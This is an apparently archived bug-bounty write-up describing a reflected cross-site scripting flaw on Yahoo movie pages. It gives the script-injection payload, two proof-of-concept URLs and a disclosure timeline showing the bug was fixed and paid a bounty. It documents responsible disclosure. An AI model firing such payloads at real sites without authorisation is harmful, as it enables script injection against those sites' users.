---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-08-31_reflected-xss-in-yahoo.md
original_filename: 2017-08-31_reflected-xss-in-yahoo.md
title: Reflected XSS in Yahoo!
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 1c7daaae505c5ae964db8c7645980d3173a6ec7674220f5f68fcaf8dd5b40332
text_sha256: 8174ff51413585cf2f4ae8b1a810e43fb04b8260a0fc2ed9f647f72f0fe6e320
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Reflected XSS in Yahoo!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-08-31_reflected-xss-in-yahoo.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `1c7daaae505c5ae964db8c7645980d3173a6ec7674220f5f68fcaf8dd5b40332`
- Text SHA256: `8174ff51413585cf2f4ae8b1a810e43fb04b8260a0fc2ed9f647f72f0fe6e320`


## Content

---
title: "Reflected XSS in Yahoo!"
url: "https://medium.com/@TheShahzada/reflected-xss-in-yahoo-6e2b6b177448"
authors: ["Shahzada AL Shahriar Khan (@TheShahzada)"]
programs: ["Yahoo! / Verizon Media"]
bugs: ["Reflected XSS"]
bounty: "700"
publication_date: "2017-08-31"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6114
scraped_via: "browseros"
---

# Reflected XSS in Yahoo!

Reflected XSS in Yahoo!
Shahzada AL Shahriar Khan
Follow
2 min read
·
Aug 31, 2017

125

Shahzada Al Shahriar Khan Thursday, August 31, 2017 Bug Bounty Cross-Site Scripting Ethical Hacking Hackerone Reflected XSS in Yahoo XSS In Yahoo

Hello Guys, This is Shahzada Al Shahriar Khan. Known as TheShahzada.

I am from Bangladesh. And I am Newbie in Bug Bounty. :P

Well, Now I will share how I found Reflected Cross-Site Scripting (XSS) in main & sub domain of Yahoo.

Vulnerable URL:
1. https://www.yahoo.com/movies/film/[*]
2. https://ca.yahoo.com/movies/film/[*]

Payload I Use:
“><%2fscript><script>alert(document.domain)<%2fscript>

PoC URL:
1. https://www.yahoo.com/movies/film/"><%2fscript><script>alert(document.domain)<%2fscript>
2. https://ca.yahoo.com/movies/film/"><%2fscript><script>alert(document.domain)<%2fscript>

Get Shahzada AL Shahriar Khan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

PoC:

Press enter or click to view image in full size
Press enter or click to view image in full size

Yahoo Canada Subdomain

Video PoC:

https://youtu.be/QHRbzyIlpkc

Timeline: Aug 12th — I Submitted The Report. Aug 15th — Triaged The Report & Rewarded Me $300 Initial Bounty. Aug 16th — Resolved Aug 24th — $400 Bounty Rewarded.

./The_S

Originally published at blog.theshahzada.com on August 31, 2017.
